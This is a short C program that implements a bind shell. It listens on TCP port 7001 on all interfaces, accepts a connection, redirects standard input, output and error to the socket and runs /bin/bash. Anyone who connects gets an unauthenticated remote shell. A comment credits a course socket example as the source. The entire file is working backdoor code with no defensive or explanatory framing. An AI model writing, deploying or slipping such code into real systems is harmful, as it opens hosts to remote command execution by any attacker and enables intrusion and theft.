#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>  

// shamelessly adapted from http://cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html

int main() {
    int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(7001);
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    bind(listen_socket, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    listen(listen_socket, 5);
    int clientfd = accept(listen_socket, NULL, NULL);
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);
    char *arguments[] = {"/bin/bash", NULL};
    execve("/bin/bash", arguments, NULL);
}

